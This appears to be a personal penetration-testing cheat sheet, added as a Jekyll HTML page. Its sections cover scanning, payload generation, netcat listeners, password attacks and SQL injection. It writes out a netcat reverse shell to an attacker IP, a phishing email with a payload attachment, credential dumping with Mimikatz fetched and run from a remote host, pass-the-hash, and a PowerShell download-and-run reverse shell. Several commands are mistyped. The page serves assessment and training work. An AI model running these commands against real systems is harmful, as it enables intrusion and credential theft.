@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=6078930006c3c674839d81302710732ce523e3ba">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>CISA Tools | Henry Earl</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="CISA Tools" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Henry Earl’s InfoSec Repo" />
+<meta property="og:description" content="Henry Earl’s InfoSec Repo" />
+<link rel="canonical" href="http://localhost:4000/docs/HowToDocs/CISA/tools.html" />
+<meta property="og:url" content="http://localhost:4000/docs/HowToDocs/CISA/tools.html" />
+<meta property="og:site_name" content="Henry Earl" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"CISA Tools","url":"http://localhost:4000/docs/HowToDocs/CISA/tools.html","description":"Henry Earl’s InfoSec Repo","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Henry Earl</h1>
+        </a>
+        <h2>Henry Earl's InfoSec Repo</h2>
+
+        <section id="downloads">
+          
+          <nav class="horizontalNAV">
+            <a href="/docs/aboutme" class="btn">About Me</a>
+            <a href="/docs/HowToDocs/" class="btn">HowToDocs</a>
+            <a href="https://www.youtube.com/channel/UCsmRRdk_D0C1f5Dt4n-8kJw?view_as=subscriber" class="btn">YouTube</a>
+            <a href="https://twitter.com/AoXHenryEarl" class="btn">Twitter</a>
+            <a href="https://www.twitch.tv/1amhenryearl" class="btn">Twitch</a>
+          
+          <a href="https://github.com/HenryEarl/HenryEarl.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </nav>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="network-reconnaissance">Network Reconnaissance</h1>
+
+<h3 id="nmap">NMAP</h3>
+<h6 id="ping-sweep">Ping Sweep</h6>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -n -sn &lt;x.x.x.x/xx or x.x.x.x-xxx&gt; -oG - | awk '/Up$/{print $2}'
+</code></pre></div></div>
+<p>Take this ping sweep over to a targeted scan. You can replace the “–top-ports” with “-p-“ or a list of desired ports.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --top-ports -sC -sV -oA nmap/targeted --script vuln "ipaddress from port scan"
+</code></pre></div></div>
+<h6 id="deeper-scanning">Deeper Scanning</h6>
+<p>Run an Nmap scan for all tcp ports</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --min-rate=1000 -T4 "ip address here" &gt; output_nmap.txt
+</code></pre></div></div>
+<p>This information can be cleaned up a little with this.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat output_nmap.txt | grep ^[0-9] | cat output_nmap.txt |  cut -d '/' -f 1 |  tr '\n' ',' | sed s/,$//
+</code></pre></div></div>
+<h6 id="my-favorite-nmap-scan">My Favorite Nmap Scan</h6>
+<p>This scan implies that you have a “nmap” directory where the scan is ran from.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -oA nmap/init "ip address"
+</code></pre></div></div>
+<p><a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Thanks IppSec</a></p>
+<h3 id="nessus">Nessus</h3>
+<p>Start Nessus</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service nessusd start
+</code></pre></div></div>
+<p>Browse to the https://”nessus host”:8834</p>
+<ul>
+  <li>Username: root</li>
+  <li>Password: toor
+Create a new Advanced Scan</li>
+  <li>Turn off ping</li>
+  <li>Enable generic web application tests.</li>
+</ul>
+
+<h3 id="simplyemail">SimplyEmail</h3>
+<h3 id="theharvester">theHarvester</h3>
+
+<h1 id="web-application-reconnaissance">Web Application Reconnaissance</h1>
+<h3 id="vega">Vega</h3>
+<p>Open Vega by selecting the icon from the sidebar or menu in Kali.</p>
+<h3 id="acunetix">Acunetix</h3>
+<h3 id="burp-suite">Burp Suite</h3>
+<h3 id="nessus-1">Nessus</h3>
+<h3 id="nikto">Nikto</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h "ip address"
+</code></pre></div></div>
+<h3 id="nmap-scripting-engine">Nmap Scripting Engine</h3>
+
+<h1 id="payload-generation">Payload Generation</h1>
+<h3 id="cobalt-strike">Cobalt Strike</h3>
+<h3 id="msfvenom">MSFvenom</h3>
+<h3 id="veil-framework">Veil Framework</h3>
+<p>start Veil Framework navigate to the /Veil Framwork directory.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Veil.py
+</code></pre></div></div>
+<p>If you have the ability to select between “Evasion and Ordnance” use Evasion. 
+Run the “list” command to show Available Tools.
+Use the ‘python/meterpreter/rev_tcp.py’ option from the list. Example below</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use 28
+</code></pre></div></div>
+<p>The check the Required Options.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>options
+</code></pre></div></div>
+<p>Set the lhost ip address. 
+Now you can Generate the payload.</p>
+
+<h1 id="listeners">Listeners</h1>
+<h3 id="cobalt-strike-1">Cobalt Strike</h3>
+<h3 id="metasploit">Metasploit</h3>
+<h3 id="netcat">netcat</h3>
+<p>Set up listening connection on port 4444</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Connect to remote machine on port 4444</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nv 10.0.0.2 4444
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nv "attackerIP" 4444 -e /bin/bash
+</code></pre></div></div>
+
+<p>Setup listening connection and redirect incoming input into an exe</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444 &gt; incoming.exe
+</code></pre></div></div>
+
+<h1 id="email-client">Email Client</h1>
+<h3 id="cobalt-strike-2">Cobalt Strike</h3>
+<h3 id="sendemail">SendEmail</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
+123.123.123.?:25 -u foo -a payload.py -m Click Me
+</code></pre></div></div>
+
+<h1 id="enumeration">Enumeration</h1>
+<h3 id="powersploit">PowerSploit</h3>
+
+<h1 id="visual-inspection">Visual Inspection</h1>
+<h3 id="aquatone">Aquatone</h3>
+<h3 id="eyewitness">EyeWitness</h3>
+
+<h1 id="directory-bruce-force">Directory Bruce-Force</h1>
+<h3 id="dirbuster">DirBuster</h3>
+<h3 id="gobuster">Gobuster</h3>
+
+<h1 id="password-attacks">Password Attacks</h1>
+<h3 id="hashcat">hashcat</h3>
+<h3 id="hydra">Hydra</h3>
+<p>Hint: <strong>Passwords formatted Season + year + punctuation are popular password options (in the case of this exercise, assume the year is 2018).</strong> Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L domain_users.txt -P pwd_guesses.txt -o output.txt 10.10.10.10 smb.
+</code></pre></div></div>
+<h3 id="kerberoast">Kerberoast</h3>
+<p>When you have a Meterpreter shell on a target, you may be able to use the Kerberoast method to obtain crack-able strings from the target.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load powershell
+</code></pre></div></div>
+<p>Then import PowerView.ps1 located in the ‘/root/Tools/PowerSploit/Recon’with the command.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell_import "/path/to/"PowerView.ps1
+</code></pre></div></div>
+<p>Open a PowerShell shell on the target using:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell_shell
+</code></pre></div></div>
+<p>So that you can run:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Kerberoast | fl
+</code></pre></div></div>
+<p>If this method is successful, a hash or multiple hashes will be displayed in the output.</p>
+
+<p>The format for the hashes is not ideal for cracking. To ensure it is formatted correctly for tools like hashcat, copy and paste the hash into a file (i.e. raw-kerberoast-hash) and run the following command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'cat raw-kerberoast-hash | tr -d ' \r\n’ &gt; kerberoast-hash'.
+</code></pre></div></div>
+<h3 id="mimikatz">mimikatz</h3>
+
+<p>The Invoke-Mimikatz.ps1 script (located in ‘root/Tools/PowerSploit/Exfiltration’) can be used to dump cleartext credentials on a target. To dump credentials on your target, run the following command: ‘powershell -nop -ep bypass “IEX (New-Object Net.WebClient).DownloadString(‘http://<ip address="" of="" machine="" hosting="" the="" ps1="" file="">/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds'. If successful, you will see cleartext passwords associated with usernames.</ip></p>
+
+<h3 id="responder">Responder</h3>
+<p>Machines that don’t require SMB signing are vulnerable to SMB relaying.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -v -I eth0
+</code></pre></div></div>
+<h3 id="multirelay">MultiRelay</h3>
+
+<p>Run from the “usr/share/responder/tools” directory:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./MultiRelay.py -t 10.10.10.10 -u “Jane Doe"
+</code></pre></div></div>
+<p>Use the Available Commands after connection for interation options.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Available commands
+</code></pre></div></div>
+
+<h3 id="samdump2">samdump2</h3>
+
+<p>If you are able to obtain SAM and System dumps (i.e. via smbclient or another method of access), a tool called samdump2 can be helpful in extracting hashes. Assuming your dumps are sam.dmp and sys.dmp, run the following command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samdump2 -o hash.dmp sys.dmp sam.dmp
+</code></pre></div></div>
+<p>Print the hash.dmp file when the function is complete to see the output.</p>
+<h3 id="pth-winexe">pth-winexe</h3>
+<p>Pass the Hash of a user and open a cmd shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pth-winexe -u administrator%"hash"//"target ip" cmd.exe
+</code></pre></div></div>
+<h1 id="exploitationprivilege-escalation">Exploitation/Privilege Escalation</h1>
+<h3 id="powersploit-1">PowerSploit</h3>
+<p>The “PowerUp.ps1” script (located in “root/Tools/Powersploit/Privesc”) can be used to automate the process of identifying Windows misconfigurations which are potential privilege escalation vectors. Additional research can be done to understand how to leverage the discovered misconfigurations, as methods may vary.
+<a href="https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70">ReadTeam_CheatSheet</a></p>
+
+<h3 id="kerberoast-1">Kerberoast</h3>
+<h3 id="burp-suite-1">Burp Suite</h3>
+<h3 id="metasploit-1">Metasploit</h3>
+<h3 id="searchsploit">SearchSploit</h3>
+<h3 id="sqlmap">sqlmap</h3>
+<p>create file from burp with loginin POST from burp suite - This is easier when done under the target usage –batch assume defaults good for background enumeration.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
+</code></pre></div></div>
+<p>Basic sqlmap command usage</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u "http://10.20.160.35/?action-data_management&amp;cpmvc_do_action=mvparse&amp;f=edit&amp;id=1" --dbs
+sqlmap -u "http://10.20.160.35/?action-data_management&amp;cpmvc_do_action=mvparse&amp;f=edit&amp;id=1" -D "databasename" --tables 
+sqlmap -u "http://10.20.160.35/?action-data_management&amp;cpmvc_do_action=mvparse&amp;f=edit&amp;id=1" -D "databasename" -T "tables" --columns 
+sqlmap -u "http://10.20.160.35/?action-data_management&amp;cpmvc_do_action=mvparse&amp;f=edit&amp;id=1" -D "databasename" -T "tables" -C "columnName" --dump
+</code></pre></div></div>
+<p>Manual testing for sqlmap can include using the following.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://site/name.php?henryearl=1
+http://site/name.php?henryearl=1'
+http://site/name.php?henryearl=-1
+http://site/name.php?henryearl=-1'
+</code></pre></div></div>
+<p><a href="https://www.youtube.com/watch?v=oWHKIiRGjtQ">Thanks to Database Tutorials</a></p>
+
+<p>Wordpress Calendar SQL</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u "http://"url"/?action=data_management&amp;cpmvc_do_action=mvparse&amp;f=datafeed&amp;method=remove&amp;rruleType=del_only&amp;calendarId=123" -p calendarId
+</code></pre></div></div>
+<p>The big thing here is the <strong>calendarId</strong></p>
+
+<h1 id="data-exfiltration">Data Exfiltration</h1>
+<h3 id="egress-assess">Egress-Assess</h3>
+<p>In order to fulfill the data exfiltration service of an assessment, a tool called Egress-Assess is used. On the designated Egress-Assess server (the external Egress-Assess Kali machine) navigate to “root/Tools/Egress-Assess” and run:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Egress-Assess.py --server "protocol"
+</code></pre></div></div>
+<p>For ftp and smtp protocols, specify a –username and –password that the client can use to connect and be sure to indicate those on the client as well.</p>
+
+<p>Once your server is set up, use the Egress-Assess client (the internal Egress-Assess Kali machine) and navigate to the “root/Tools/Egress-Assess” directory. Run the following command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Egress-Assess.py --client &lt;protocol&gt; --ip &lt;server ip address&gt; --datatype ssn –data-size 15’.
+</code></pre></div></div>
+<p>Repeat this process for each of the protocols (http, https, ftp, icmp, smb, dns, smtp) and use the server output to determine if the data exfiltration was blocked or not. Use a smaller data size for DNS and ICMP protocols since they utilize a lot of packets. Include the results in your report.</p>
+
+<h1 id="windows-powershell">Windows Powershell</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX(New-Object System.Net.WebClient).downloadString('http://"local ip"/Invoke-PowerShellTcp.ps1').  
+</code></pre></div></div>
+<h1 id="kali-web-server">Kali Web Server</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m htt.server 8080
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m SimpleHTTPServer 8080
+</code></pre></div></div>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
